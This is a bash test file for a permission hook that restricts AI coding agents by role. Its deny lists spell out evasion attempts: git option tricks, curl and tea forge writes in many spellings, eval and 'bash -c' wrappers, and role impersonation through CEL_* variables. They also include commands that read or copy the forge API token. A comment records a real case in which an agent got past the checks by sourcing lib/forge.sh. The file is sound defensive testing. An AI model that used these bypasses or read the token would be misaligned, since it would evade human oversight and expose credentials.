# shellcheck shell=bash
source "$CEL_ROOT/lib/common.sh"
source "$CEL_ROOT/lib/guard.sh"
HOOK="$CEL_ROOT/tools/hooks/orchestrator-guard.sh"

# Read-only coordinators. The agents that decide are not the agents that can
# change; a bad prompt produces a refusal, not an incident.

_gws() { # a workspace dir with one repo, returned in $T
  T="$(mktemp -d)"; cp "$CEL_ROOT/tests/fixtures/ws-alpha/workspace.yaml" "$T/"
  mkdir -p "$T/repos/widget/src" "$T/.cel"
}

# --- who am I --------------------------------------------------------------
# A herdr worktree is no Celestial agent's home: it falls through to the
# workspace walk like any other path.
test_role_of_a_herdr_worktree_path_is_not_special() {
  assert_eq "$(CEL_WORKTREES=/tmp/wt guard_role_of /tmp/wt/repo/WG-1-x)" other
  _gws; mkdir -p "$T/wt/repo"
  assert_eq "$(CEL_WORKTREES="$T/wt" guard_role_of "$T/wt/repo")" root
  rm -rf "$T"
}
test_role_orchestrator_from_repo_checkout() {
  _gws; assert_eq "$(guard_role_of "$T/repos/widget")" orchestrator
  assert_eq "$(guard_role_of "$T/repos/widget/src")" orchestrator; rm -rf "$T"
}
test_role_root_from_workspace_dir() {
  _gws; assert_eq "$(guard_role_of "$T")" root
  assert_eq "$(guard_role_of "$T/.cel")" root; rm -rf "$T"
}
test_role_other_outside_any_workspace() {
  assert_eq "$(guard_role_of /tmp)" other
}

# --- what may an orchestrator do -------------------------------------------
test_orchestrator_may_read() {
  assert_eq "$(guard_classify orchestrator 'git log --oneline -5')" allow
  assert_eq "$(guard_classify orchestrator 'git diff origin/main..HEAD --stat')" allow
  assert_eq "$(guard_classify orchestrator 'gh pr view 12 --json state')" allow
  assert_eq "$(guard_classify orchestrator 'gh pr list --author @me')" allow
  assert_eq "$(guard_classify orchestrator 'cat repos/widget/README.md')" allow
  assert_eq "$(guard_classify orchestrator 'git fetch origin && git pull --ff-only')" allow
}
test_orchestrator_may_use_the_mechanism() {
  assert_eq "$(guard_classify orchestrator 'cel-linear state WG-1 "In Progress"')" allow
  assert_eq "$(guard_classify orchestrator 'cel inbox send root "status"')" allow
  assert_eq "$(guard_classify orchestrator 'cd /x && cel fleet')" allow
}
test_orchestrator_may_comment_and_review() {
  assert_eq "$(guard_classify orchestrator 'gh pr comment 12 --body "looks right"')" allow
  assert_eq "$(guard_classify orchestrator 'gh pr review 12 --approve')" allow
}
test_orchestrator_may_write_its_own_notes() {
  assert_eq "$(guard_classify orchestrator 'cat > .cel/spec-WG-1.md <<EOF')" allow
  assert_eq "$(guard_classify orchestrator 'printf x > /tmp/ws/.cel/notes.md')" allow
  _gws; assert_eq "$(guard_classify_path orchestrator "$T/.cel/spec.md")" allow; rm -rf "$T"
}

# An orchestrator owns the STATE of its own checkout, never its authorship.
# It may move onto a PR branch to run it locally and back to main; moving
# between refs that already exist creates
# and discards nothing; the guard exists to stop authorship.
test_orchestrator_may_move_its_own_checkout() {
  local c
  for c in 'git checkout main' 'git switch main' 'git checkout origin/W-49-slug' \
           'gh pr checkout 1393' 'git branch -d W-49-slug' \
           'gh pr edit 12 --add-label builder-preview' 'gh pr edit 12 --remove-label x'; do
    assert_eq "$(guard_classify orchestrator "$c")" allow
  done
}
# Creating a branch, discarding a file, or reaching into someone else's
# checkout is not state - it is authorship, or it is another agent's business.
test_orchestrator_may_not_author_via_checkout() {
  local c
  for c in 'git checkout -b new' 'git switch -c new' 'git checkout -- apps/foo.ts' \
           'git checkout .' 'git restore x' 'git checkout main -- file' \
           'git -C ~/ws/alpha/repos/widget checkout main' \
           'git -C ~/.herdr/worktrees/widget/w-49 checkout main' \
           'git branch -D old' 'git branch -m a b' \
           'gh pr edit 12 --title x' 'gh pr edit 12 --add-label x --body y' \
           'gh pr ready 12' 'gh pr merge 12'; do
    assert_contains "$(guard_classify orchestrator "$c")" deny
  done
}
# The same table from root's standpoint: its own config repo is not a
# product checkout.
test_checkout_table_for_root() {
  assert_eq "$(guard_classify root 'git checkout main')" allow
  assert_eq "$(guard_classify root 'git checkout -b new')" allow
  assert_contains "$(guard_classify root 'git -C repos/widget checkout main')" deny
  assert_contains "$(guard_classify root 'gh pr merge 12')" deny
  assert_contains "$(guard_classify root 'gh pr edit 12 --add-label x')" deny
}

# --- what it may not -------------------------------------------------------
test_orchestrator_may_not_mutate_git() {
  local c
  for c in 'git commit -m x' 'git push origin main' 'git merge feature' 'git rebase main' \
           'git reset --hard' 'git checkout -b new' 'git switch -c new' 'git stash' \
           'git add -A' 'git worktree remove foo' 'git branch -D old' 'git cherry-pick abc' \
           'git restore x' 'git checkout .' \
           'cd repos/widget && git commit -am fix'; do
    assert_contains "$(guard_classify orchestrator "$c")" deny
  done
}
# `git -C <dir> <verb>` puts a path between git and the verb; a naive
# substring match on "git commit" lets it through. Found by the root test,
# but it is an orchestrator-grade hole: -C is exactly how a command reaches
# into a product checkout from anywhere.
test_orchestrator_may_not_evade_with_git_options() {
  local c
  for c in 'git -C repos/widget commit -m x' 'git -C /tmp/ws/repos/widget push' \
           'git --git-dir=repos/widget/.git commit -m x' 'git -c user.name=x -C repos/widget merge f' \
           'git -C . commit -am fix'; do
    assert_contains "$(guard_classify orchestrator "$c")" deny
  done
}
# A coordinator does not drive herdr worktrees: the solo agent manages its own.
test_orchestrator_may_not_drive_herdr_worktrees_directly() {
  assert_contains "$(guard_classify orchestrator 'herdr worktree remove --workspace w9Z --force')" deny
  assert_contains "$(guard_classify root 'sleep 5; herdr worktree remove --workspace w9Z --force 2>&1 | jq .')" deny
  assert_contains "$(guard_classify orchestrator 'herdr worktree create --workspace w1 --branch x')" deny
  assert_contains "$(guard_classify orchestrator 'herdr worktree remove --workspace w9Z')" 'solo agent'
  assert_eq "$(guard_classify orchestrator 'herdr workspace list')" allow
  assert_eq "$(guard_classify orchestrator 'herdr agent list')" allow
}
test_orchestrator_may_not_change_github_state() {
  local c
  for c in 'gh pr merge 12 --squash' 'gh pr close 12' 'gh pr ready 12' 'gh pr create --fill' \
           'gh pr edit 12 --title x' 'gh api -X POST repos/o/r/pulls/1/merge' 'gh api repos/o/r --method PATCH'; do
    assert_contains "$(guard_classify orchestrator "$c")" deny
  done
}
test_orchestrator_may_not_edit_repo_files_by_shell() {
  local c
  for c in 'sed -i s/a/b/ repos/widget/x.ts' 'echo x > repos/widget/x.ts' 'echo x >> /tmp/ws/repos/widget/x.ts' \
           'rm repos/widget/x.ts' 'mv repos/widget/a repos/widget/b' 'tee repos/widget/x.ts'; do
    assert_contains "$(guard_classify orchestrator "$c")" deny
  done
}
test_orchestrator_may_not_edit_repo_files_by_tool() {
  _gws
  assert_contains "$(guard_classify_path orchestrator "$T/repos/widget/src/x.ts")" deny
  assert_contains "$(guard_classify_path root "$T/repos/widget/README.md")" deny
  rm -rf "$T"
}
# Root's cwd is the WORKSPACE repo - config, not product - which root and the
# owner legitimately commit to. Product checkouts stay off-limits.
test_root_may_commit_workspace_config_but_not_products() {
  assert_eq "$(guard_classify root 'git add workspace.yaml && git commit -m tune')" allow
  assert_eq "$(guard_classify root 'git push')" allow
  assert_contains "$(guard_classify root 'cd repos/widget && git commit -m x')" deny
  assert_contains "$(guard_classify root 'git -C repos/widget push')" deny
  assert_contains "$(guard_classify root 'git -C /home/x/.herdr/worktrees/w/b commit -m x')" deny
  assert_contains "$(guard_classify root 'gh pr merge 3')" deny
  assert_eq "$(guard_classify root 'cel run orchestrator --repo widget')" allow
}
test_hook_opt_out_per_pane() {
  _gws
  CEL_GUARD=0 _hook "$T/repos/widget" Bash '{"command":"git commit -m x"}' || { echo "CEL_GUARD=0 ignored"; rm -rf "$T"; return 1; }
  rm -rf "$T"
}

# --- solo: the builder, without the factory ----------------------------------
# A solo agent stands where an orchestrator stands, so only CEL_ROLE can tell
# the two apart - and it must, or the solo agent could not write a line.
test_role_solo_from_the_launch_not_the_path() {
  _gws
  assert_eq "$(CEL_ROLE=solo guard_role_of "$T/repos/widget")" solo
  assert_eq "$(guard_role_of "$T/repos/widget")" orchestrator
  rm -rf "$T"
}
test_solo_may_build_and_ship() {
  assert_eq "$(guard_classify solo 'git commit -m x')" allow
  assert_eq "$(guard_classify solo 'git push -u origin WG-1-x')" allow
  assert_eq "$(guard_classify solo 'git worktree add ../wt -b WG-2-y origin/main')" allow
  assert_eq "$(guard_classify solo 'gh pr create --fill')" allow
  assert_eq "$(guard_classify solo 'cel run reviewer --repo widget --pr 12')" allow
  assert_eq "$(guard_classify solo 'cel mode bundle fleet')" allow
  assert_eq "$(guard_classify_path solo /ws/repos/widget/src/x.ts)" allow
}
test_solo_may_not_start_agents() {
  local c
  for c in 'cel run orchestrator --product bundle' 'cel run solo --product bundle --lane x' \
           'cel run core' 'cel core' 'herdr agent start foo --kind pi' 'herdr worktree create --branch x'; do
    case "$(guard_classify solo "$c")" in deny*) ;; *) echo "solo allowed: $c"; return 1;; esac
  done
}
test_solo_may_not_merge_by_hand() {
  local c
  for c in 'gh pr merge 12 --squash' 'gh -R a/b pr merge 5' 'gh --repo=a/b pr merge 5' \
           'gh api -X PUT repos/a/b/pulls/5/merge' 'tea pr merge 5' 'tea pulls m 5' \
           'curl -X POST http://forgejo.internal/api/v1/repos/geoff/gizmo/pulls/31/merge' \
           '/usr/bin/curl --config - http://forgejo.internal/api/v1/repos/geoff/gizmo/pulls/31/merge -d @b.json'; do
    case "$(guard_classify solo "$c")" in deny*) ;; *) echo "solo allowed: $c"; return 1;; esac
  done
}
# `cel forge` is a door on both forges: its reads are everyone's, opening a
# PR is the builder's (solo) and never an orchestrator's, and the
# same writes by hand - tea, or curl at a forge's API - stay refused.
test_cel_forge_reads_are_open_and_pr_create_is_the_builders() {
  local role c
  for role in orchestrator root core solo; do
    for c in 'cel forge pr view gizmo#31' 'cel forge pr checks gizmo#31 --json' 'cel forge pr reviews gizmo#31' \
             'cel forge pr list gizmo open' 'cel forge whoami gizmo' 'cel forge repo gizmo'; do
      assert_eq "$(guard_classify "$role" "$c")" allow || { echo "$role refused: $c"; return 1; }
    done
  done
  assert_eq "$(guard_classify solo 'cel forge pr create gizmo --head WG-1-x --base main --title t --body-file b.md')" allow || return 1
  for role in orchestrator root core; do
    for c in 'cel forge pr create gizmo --head WG-1-x --base main --title t --body-file b.md' \
             'cel --workspace sandbox forge pr create gizmo --head a --base main --title t --body-file b'; do
      case "$(guard_classify "$role" "$c")" in deny*) ;; *) echo "$role allowed: $c"; return 1;; esac
    done
  done
  for c in 'tea pr merge 31' 'tea pulls create --title x' 'tea pr close 31' 'tea pr approve 31' \
           'curl -X POST http://forgejo.internal/api/v1/repos/geoff/gizmo/pulls/31/merge' \
           'curl --request=PATCH http://forgejo.internal/api/v1/repos/geoff/gizmo/pulls/31' \
           'curl -XDELETE http://forgejo.internal/api/v1/repos/geoff/gizmo/branch_protections/main' \
           'curl -d @body.json http://forgejo.internal/api/v1/repos/geoff/gizmo/pulls' \
           'curl --json {} https://api.github.com/repos/o/r/pulls'; do
    case "$(guard_classify orchestrator "$c")" in deny*) ;; *) echo "orchestrator allowed: $c"; return 1;; esac
  done
  for c in 'curl -s http://forgejo.internal/api/v1/repos/geoff/gizmo/pulls/31' 'tea pr list' 'tea pr 31'; do
    assert_eq "$(guard_classify orchestrator "$c")" allow || { echo "orchestrator refused a read: $c"; return 1; }
  done
}
# A forge write by hand is refused however the client is spelled: curl with
# a body in any form (-d@x, -dX, --data-*, -F/--form, -T/--upload-file,
# --json), a method in any form (-X POST, -XPOST, -sXPOST, --request[=]M, any
# case) or options from a file (-K/--config); `tea api` with anything but a
# plain GET; tea's write verbs with its global flags before them. Every role
# that can run the guard: orchestrators, root and core change no forge state,
# and a solo agent changes its forge only through `cel forge` and
# `cel solo land`.
test_raw_forge_writes_are_refused_however_they_are_spelled() {
  local fj=http://forgejo.internal/api/v1/repos/o/r role c
  local -a writes=(
    "curl -d@b.json $fj/pulls" "curl -dFILE $fj/issues/3/comments" "curl -sXPOST $fj/pulls/3/merge"
    "curl -XPOST $fj/pulls/3/merge" "curl -X post $fj/pulls/3" "curl --request DELETE $fj/branch_protections/main"
    "curl --request=PATCH $fj/pulls/3" "curl --data-binary @x $fj/pulls" "curl --data-raw {} https://api.github.com/repos/o/r/pulls"
    "curl --data-urlencode a=b $fj/pulls" "curl -F f=@x $fj/releases/1/assets" "curl --form f=@x $fj/releases/1/assets"
    "curl -T x $fj/contents/a" "curl --upload-file x $fj/contents/a" "curl --json {} $fj/pulls"
    "curl -K cfg $fj/pulls/3/merge" "curl --config=cfg $fj/pulls/3/merge" "/usr/bin/curl -fsSd@x $fj/pulls"
    'tea api -X POST repos/o/r/pulls/3/merge' 'tea api -XPOST repos/o/r/pulls/3/merge'
    'tea api --method=DELETE repos/o/r/branch_protections/main' 'tea api --method PATCH repos/o/r/pulls/3'
    'tea api -f title=x repos/o/r/pulls' 'tea api --data @b.json repos/o/r/pulls'
    'tea pulls --repo o/r merge 3' 'tea --login fj pr close 3' 'tea pr --repo o/r create --title x'
    'tea -l fj pulls -r o/r m 3' 'tea branches protect main' 'tea releases delete v1'
  )
  for role in orchestrator root core solo; do
    for c in "${writes[@]}"; do
      case "$(guard_classify "$role" "$c")" in deny*) ;; *) echo "$role allowed: $c"; return 1;; esac
    done
  done
  # reads stay reads
  for role in orchestrator solo other; do
    for c in "curl -s $fj/pulls/3" "curl -sSfL $fj/pulls" "curl -o out.json $fj/pulls" "curl -X GET $fj/pulls/3" \
             "curl -sI $fj/pulls/3" 'tea api repos/o/r/pulls/3' 'tea api -X GET repos/o/r/pulls/3' 'tea pr list --repo o/r' 'tea pr 31'; do
      assert_eq "$(guard_classify "$role" "$c")" allow || { echo "$role refused a read: $c"; return 1; }
    done
  done
}
# The Forgejo token is the forge's own key: no agent reads, copies or rewrites
# it, whichever role it plays and however it names the file.
test_no_agent_reads_or_writes_the_forge_token() {
  local role c
  for role in orchestrator root core solo other; do
    for c in 'cat ~/.config/cel/forge/forgejo.internal.token' 'less $HOME/.config/cel/forge/x.token' \
             'head -c5 ${XDG_CONFIG_HOME:-~/.config}/cel/forge/forgejo.internal.token' \
             'cp ~/.config/cel/forge/forgejo.internal.token /tmp/t' 'base64 /home/u/.config/cel/forge/*' \
             'ls ~/.config/cel/forge' 'cd ~/.config/cel/forge && cat *' "grep -r . \"\$HOME/.config/cel/forge/\""; do
      case "$(guard_classify "$role" "$c")" in deny*) ;; *) echo "$role allowed: $c"; return 1;; esac
    done
    case "$(guard_classify_read "$role" /home/u/.config/cel/forge/forgejo.internal.token)" in deny*) ;; *) echo "$role may Read the token"; return 1;; esac
    case "$(guard_classify_path "$role" /home/u/.config/cel/forge/forgejo.internal.token)" in deny*) ;; *) echo "$role may write the token"; return 1;; esac
    assert_eq "$(guard_classify_read "$role" /home/u/ws/repos/widget/lib/forge.sh)" allow || return 1
  done
  # the plane's own files are not the token
  assert_eq "$(guard_classify orchestrator 'cat lib/forge.sh tests/fixtures/forge/forgejo/pull.json')" allow
}
# lib/forge.sh is cel's own code: sourcing it and calling its functions
# reaches the forge with the token and none of `cel forge`'s checks (a
# product agent closed PRs that way). Refused to every role however it is
# spelled - `.` or `source`, any path, inside `bash -c`, a `$(...)` - while
# reading the file and `cel forge` itself stay open.
test_no_agent_sources_lib_forge_or_calls_its_functions() {
  local role c
  local -a calls=(
    "bash --noprofile --norc -c 'export CEL_ROOT=/w/celestial; . \$CEL_ROOT/lib/common.sh; . \$CEL_ROOT/lib/workspace.sh; . \$CEL_ROOT/lib/forge.sh; _forge_fj forgejo.internal PATCH http://forgejo.internal/api/v1/repos/o/r/pulls/3 {}'"
    'source /home/u/celestial/lib/forge.sh && forge_pr_view /w gizmo 3'
    '. lib/forge.sh' 'source "$CEL_ROOT/lib/forge.sh"'
    "bash -c '_forge_fj_get x forgejo.internal http://forgejo.internal/api/v1/user'"
    "bash --norc -c '_forge_forgejo_pr_merge /w {} 3 abc'"
    'd=$(forge_repo /home/u/ws/sandbox gizmo); echo $d'
    '_forge_fj forgejo.internal GET http://forgejo.internal/api/v1/user'
    'x=_forge_fj; $x forgejo.internal PATCH http://forgejo.internal/api/v1/repos/o/r/pulls/3 {}'
    "f='forge_pr_close'; \$f /w gizmo 3"
    'eval "_forge_fj forgejo.internal GET http://forgejo.internal/api/v1/user"'
    'eval "$(cat lib/forge.sh)"; forge_whoami /w gizmo'
    'source <(cat /home/u/celestial/lib/forge.sh)'
  )
  for role in orchestrator root core solo other; do
    for c in "${calls[@]}"; do
      case "$(guard_classify "$role" "$c")" in "deny lib/forge.sh is cel"*"use cel forge"*) ;; *) echo "$role allowed: $c"; return 1;; esac
    done
    for c in 'cat lib/forge.sh' 'grep -n _forge_fj lib/forge.sh' 'sed -n 1,40p lib/forge.sh' 'bash -n lib/forge.sh' \
             'bash tests/run.sh forge.test.sh' 'cel forge pr view gizmo#3' 'cel forge run logs gizmo 15 --tail 50'; do
      case "$(guard_classify "$role" "$c")" in "deny lib/forge.sh"*) echo "$role refused: $c"; return 1;; esac
    done
  done
}
# `cel forge run list|view|logs` reads CI: every role, read-only members too.
# `pr close|ready` and `run rerun` change the forge: the product's own agent
# (solo, orchestrator) and the owner; never core, root, a member or a
# reviewer.
test_cel_forge_runs_are_everyones_and_close_ready_the_product_agents() {
  local role c
  for role in orchestrator root core solo other; do
    for c in 'cel forge run list gizmo --branch main' 'cel forge run list gizmo --sha 0123456789abcdef0123456789abcdef01234567' \
             'cel forge run view gizmo 9 --json' 'cel forge run logs gizmo 15 --tail 80'; do
      assert_eq "$(guard_classify "$role" "$c")" allow || { echo "$role refused: $c"; return 1; }
    done
  done
  for role in solo orchestrator other; do
    for c in 'cel forge pr close gizmo#3 --comment-file why.md' 'cel forge pr ready gizmo#3' 'cel forge run rerun gizmo 15'; do
      assert_eq "$(guard_classify "$role" "$c")" allow || { echo "$role refused: $c"; return 1; }
    done
  done
  for role in core root; do
    for c in 'cel forge pr close gizmo#3' 'cel --workspace sandbox forge pr ready gizmo#3' 'cel forge run rerun gizmo 15'; do
      case "$(guard_classify "$role" "$c")" in deny*) ;; *) echo "$role allowed: $c"; return 1;; esac
    done
  done
  for c in 'cel forge pr close gizmo#3' 'cel forge pr ready gizmo#3' 'cel forge run rerun gizmo 15'; do
    case "$(CEL_ROLE=reviewer guard_classify other "$c")" in deny*) ;; *) echo "a reviewer allowed: $c"; return 1;; esac
  done
  _team_ws
  local r
  for r in qa platform; do
    assert_eq "$(ROLE=$r _ro guard_classify member 'cel forge run logs widget 15 --tail 40')" allow || { echo "$r refused run logs"; rm -rf "$T"; return 1; }
    for c in 'cel forge pr close widget#3' 'cel forge pr ready widget#3' 'cel forge run rerun widget 15'; do
      _deny "$(ROLE=$r _ro guard_classify member "$c")" "$r: $c" || { rm -rf "$T"; return 1; }
    done
  done
  rm -rf "$T"
}
# `cel forge` reads who is asking from its environment, so a line that runs
# it while SETTING a CEL_* variable (even to empty) is refused to every role -
# the way an agent would dress up as another product. Shedding marks (unset,
# env -u, env -i) gains nothing: cel forge refuses a process with no agent
# identity, so the guard leaves those lines to it.
test_cel_forge_with_a_tampered_cel_environment_is_refused() {
  local role c
  for role in orchestrator root core solo other; do
    for c in 'CEL_ROLE= cel forge pr close gizmo#3' 'export CEL_ROLE=; cel forge pr close gizmo#3' \
             'CEL_PRODUCT=other cel forge run rerun gizmo 15' 'CEL_INBOX_ME=x-orch cel --workspace w forge pr ready gizmo#3' \
             'env CEL_ROLE=solo /home/u/celestial/bin/cel forge pr close gizmo#3' 'declare -x CEL_PRODUCT=x; cel forge pr ready gizmo#3' \
             'env -i PATH=/usr/bin CEL_ROLE=solo cel forge pr close gizmo#3'; do
      case "$(guard_classify "$role" "$c")" in "deny cel forge reads who is asking"*) ;; *) echo "$role allowed: $c"; return 1;; esac
    done
  done
  for c in 'cel forge pr close gizmo#3' 'cel --workspace sandbox forge run list gizmo' 'echo CEL_ROLE=x' 'unset CEL_ROLE; cel inbox read' \
           'env -u CEL_ROLE cel forge pr close gizmo#3' 'unset CEL_INBOX_ME CEL_ROLE && cel forge run list gizmo' \
           'env -i PATH=/usr/bin cel forge pr close gizmo#3'; do
    case "$(guard_classify solo "$c")" in "deny cel forge reads who is asking"*) echo "refused: $c"; return 1;; esac
  done
}
# ...and the hook enforces it where it runs: a reviewer pane outside any
# workspace (otherwise untouched) included, the native Read tool included.
test_hook_refuses_the_forge_token_to_every_pane() {
  _gws
  local tok='/home/u/.config/cel/forge/forgejo.internal.token' cwd
  for cwd in "$T/repos/widget" /tmp; do
    _hook "$cwd" Bash "{\"command\":\"cat $tok\"}" && { echo "hook let $cwd cat the token"; rm -rf "$T"; return 1; }
    assert_contains "$HOOK_ERR" "forge API token" || { rm -rf "$T"; return 1; }
    _hook "$cwd" Read "{\"file_path\":\"$tok\"}" && { echo "hook let $cwd Read the token"; rm -rf "$T"; return 1; }
    _hook "$cwd" Read '{"file_path":"/tmp/notes.md"}' || { echo "hook blocked an ordinary Read in $cwd"; rm -rf "$T"; return 1; }
  done
  _hook /tmp Bash '{"command":"git push"}' || { echo "hook blocked a push outside any workspace"; rm -rf "$T"; return 1; }
  rm -rf "$T"
}
# The solo agent lands through `cel solo land` but never records its own
# verdict.
test_solo_lands_but_never_reviews_itself() {
  assert_eq "$(guard_classify solo 'cel solo land widget#7')" allow
  case "$(guard_classify solo 'cel solo review widget#7 approved --head x --by me')" in deny*) ;; *) return 1;; esac
}
# The spellings that slipped past a substring match - spacing, tabs, quotes,
# options before the verb, chains, wrappers - are the SAME command.
test_factory_verbs_are_refused_however_they_are_spelled() {
  local c
  for c in 'cel  run core' "$(printf 'cel\trun core')" '"cel" run core' \
           'cel --workspace plane solo review x' 'cel -C /ws --workspace p run orchestrator' \
           'cel run "core"' 'cd x && cel solo review y' 'bash -c "cel solo review y"' \
           'FOO=1 timeout 30 /home/x/bin/cel run core' 'echo $(cel solo review y)'; do
    case "$(guard_classify solo "$c")" in deny*) ;; *) echo "solo allowed: $c"; return 1;; esac
  done
}
# ...and text that merely MENTIONS a verb is not running it.
test_factory_verbs_in_arguments_are_not_commands() {
  local c
  for c in 'grep -n "cel solo review" lib/guard.sh' 'git commit -m "never cel solo review here"' \
           'rg "gh pr merge" docs'; do
    assert_eq "$(guard_classify solo "$c")" allow
  done
}
test_hook_lets_a_solo_pane_commit() {
  _gws
  CEL_ROLE=solo _hook "$T/repos/widget" Bash '{"command":"git commit -m x"}' \
    || { echo "solo commit blocked: $HOOK_ERR"; rm -rf "$T"; return 1; }
  rm -rf "$T"
}
# A worker, scout or spike launched before fan-out retired still carries its
# CEL_ROLE. It stays restricted as a solo agent - never `other`, which would
# wave everything through: it still writes and pushes its own branch, and is
# still refused merges, raw forge writes, the forge token and starting agents.
test_retired_fanout_roles_are_guarded_as_solo() {
  _gws
  local r c fj=http://forgejo.internal/api/v1/repos/o/r
  for r in worker scout spike; do
    assert_eq "$(CEL_ROLE=$r guard_role_of "$T/repos/widget")" solo || { rm -rf "$T"; return 1; }
    assert_eq "$(CEL_ROLE=$r guard_role_of /tmp)" solo || { rm -rf "$T"; return 1; }
    for c in 'gh pr merge 12 --squash' "curl -XPOST $fj/pulls/3/merge" \
             'cat ~/.config/cel/forge/x.token' 'cel run solo --product bundle' \
             'cel run orchestrator --product bundle' 'herdr agent start foo --kind pi'; do
      CEL_ROLE=$r _hook /tmp Bash "{\"command\":\"$c\"}" \
        && { echo "$r pane allowed: $c"; rm -rf "$T"; return 1; }
    done
    CEL_ROLE=$r _hook /tmp Bash '{"command":"git commit -m x"}' \
      || { echo "$r commit blocked: $HOOK_ERR"; rm -rf "$T"; return 1; }
    CEL_ROLE=$r _hook /tmp Bash '{"command":"git push -u origin WG-1-x"}' \
      || { echo "$r push blocked: $HOOK_ERR"; rm -rf "$T"; return 1; }
  done
  rm -rf "$T"
}

# --- the hook end to end ---------------------------------------------------
_hook() { # <cwd> <tool> <input-json> -> exit code, stderr in $HOOK_ERR
  local out
  out="$(printf '{"tool_name":"%s","cwd":"%s","tool_input":%s}' "$2" "$1" "$3" \
        | bash "$HOOK" 2>&1 >/dev/null)"; local rc=$?
  HOOK_ERR="$out"; return $rc
}
test_hook_blocks_an_orchestrator_commit_with_a_reason() {
  _gws
  _hook "$T/repos/widget" Bash '{"command":"git commit -m x"}' && { echo "hook allowed a commit"; rm -rf "$T"; return 1; }
  assert_contains "$HOOK_ERR" "celestial guard (orchestrator pane)"
  assert_contains "$HOOK_ERR" "cel solo land"
  rm -rf "$T"
}
test_hook_blocks_an_orchestrator_edit_tool_under_repos() {
  _gws
  _hook "$T/repos/widget" Edit "{\"file_path\":\"$T/repos/widget/src/x.ts\",\"old_string\":\"a\",\"new_string\":\"b\"}" \
    && { echo "hook allowed an Edit under repos/"; rm -rf "$T"; return 1; }
  rm -rf "$T"
}
test_hook_allows_an_orchestrator_spec_write() {
  _gws
  _hook "$T/repos/widget" Write "{\"file_path\":\"$T/.cel/spec.md\",\"content\":\"x\"}" || { echo "hook blocked a spec write: $HOOK_ERR"; rm -rf "$T"; return 1; }
  rm -rf "$T"
}
test_hook_lets_a_pane_outside_any_workspace_through() {
  _hook /tmp Bash '{"command":"git push"}' || { echo "hook blocked a push outside any workspace: $HOOK_ERR"; return 1; }
}
test_hook_honours_the_one_off_override() {
  _gws
  _hook "$T/repos/widget" Bash '{"command":"CEL_GUARD_ALLOW_ONCE=1 git commit -m x"}' || { echo "override ignored"; rm -rf "$T"; return 1; }
  rm -rf "$T"
}
# A guard that cannot parse its input must fail OPEN: a broken hook taking
# down every tool call on the box is worse than one incident.
test_hook_fails_open_on_garbage() {
  printf 'not json' | bash "$HOOK" >/dev/null 2>&1 || { echo "hook failed closed on garbage"; return 1; }
  printf '' | bash "$HOOK" >/dev/null 2>&1 || { echo "hook failed closed on empty input"; return 1; }
}

# --- a product orchestrator -------------------------------------------------
# A product orchestrator stands in <ws>/products/<p>, not in a repo
# checkout. It is an orchestrator by the same path derivation, which means the
# same refusals: it may write its own notes and specs, and it may not reach
# into a repo.
_gws_product() { _gws; mkdir -p "$T/products/x" "$T/repos/y"; }
test_role_orchestrator_from_product_dir() {
  _gws_product
  assert_eq "$(guard_role_of "$T/products/x")" orchestrator
  assert_eq "$(guard_role_of "$T/products/x/notes")" orchestrator; rm -rf "$T"
}
test_product_orchestrator_writes_its_own_dir_but_no_repo() {
  _gws_product
  assert_contains "$(guard_classify orchestrator 'git commit -m x')" deny
  assert_eq "$(guard_classify_path orchestrator "$T/products/x/spec.md")" allow
  assert_contains "$(guard_classify_path orchestrator "$T/repos/y/a.ts")" deny
  rm -rf "$T"
}

# --- core: orchestrator-class, minus the product agent's verbs --------------
test_role_core_from_its_dir_and_the_environment() {
  local C; C="$(mktemp -d)/core"; mkdir -p "$C/notes"
  assert_eq "$(CEL_ROLE='' CEL_CORE_DIR="$C" guard_role_of "$C/notes")" core
  assert_eq "$(CEL_ROLE=core guard_role_of /tmp)" core
  rm -rf "${C%/core}"
}
# A console agent launched before the TUI was retired still carries
# CEL_ROLE=console and stands in the old console directory. It must stay
# restricted - as core, which `cel console` now starts - never fall to `other`.
test_a_legacy_console_agent_is_guarded_as_core() {
  local D; D="$(mktemp -d)"; mkdir -p "$D/cel/console/notes"
  assert_eq "$(CEL_ROLE=console guard_role_of /tmp)" core
  assert_eq "$(CEL_ROLE='' XDG_DATA_HOME="$D" guard_role_of "$D/cel/console/notes")" core
  local role; role="$(CEL_ROLE=console guard_role_of /tmp)"
  assert_contains "$(guard_classify "$role" 'git commit -m x')" deny
  rm -rf "$D"
}
test_core_may_read_coordinate_and_switch_mode() {
  local c
  for c in 'cel fleet --json' 'cel inbox send games-orch "x" --workspace w' 'cel decide list' \
           'cel mode games solo --workspace w' \
           'cel run orchestrator --product games --workspace w --restart' \
           'gh pr view 3' 'gh pr diff 3' 'git -C repos/x log --oneline' 'herdr agent focus w1:p1'; do
    assert_eq "$(guard_classify core "$c")" allow
  done
}
test_core_does_not_build_review_or_land() {
  local c
  for c in 'cel solo land celestial#3' 'cel solo review celestial#3 approved' 'cel run reviewer --repo x --pr 1' \
           'cel run root' 'cel spike x' 'gh pr merge 3' 'git -C repos/x commit -m y' 'git push' 'cel learn add x' \
           'cel release celestial 1.0.0' 'herdr worktree create --cwd x' 'herdr agent start foo --kind pi' \
           'cd /tmp && cel --workspace w solo land celestial#3'; do
    assert_contains "$(guard_classify core "$c")" deny
  done
  assert_contains "$(guard_classify core 'cel solo land celestial#3')" 'builds, reviews and lands'
}
test_core_writes_only_its_own_directory() {
  local C; C="$(mktemp -d)/core"
  assert_eq "$(CEL_CORE_DIR="$C" guard_classify_path core "$C/notes.md")" allow
  assert_contains "$(CEL_CORE_DIR="$C" guard_classify_path core "/home/x/ws/p/.cel/specs/a.md")" deny
  rm -rf "${C%/core}"
}
test_solo_agents_do_not_start_core() {
  assert_contains "$(guard_classify solo 'cel run core')" deny
  assert_contains "$(guard_classify solo 'cel console')" deny
}

# THE CLASSIFIER'S OWN FAILURE IS NOT `allow`. A mode it does not know or a
# policy that will not load exits 2 with the reason on stderr and no verdict,
# so the adapters can tell a broken classifier from a permitted call.
test_guard_classifier_failure_is_an_error_not_an_allow() {
  local cls="$CEL_ROOT/tools/hooks/guard-classify.sh" out rc
  rc=0; out="$(bash "$cls" bogus /tmp 'git push' 2>/dev/null)" || rc=$?
  assert_eq "mode:$rc:$out" "mode:2:"
  assert_contains "$(bash "$cls" bogus /tmp 'git push' 2>&1 >/dev/null)" 'unknown mode'
  local T; T="$(mktemp -d)"
  rc=0; out="$(CEL_ROOT="$T" bash "$cls" command /tmp 'git push' 2>/dev/null)" || rc=$?
  assert_eq "policy:$rc:$out" "policy:2:"
  rm -rf "$T"
  # a working classifier still answers both modes
  assert_eq "$(bash "$cls" command /tmp 'ls')" allow
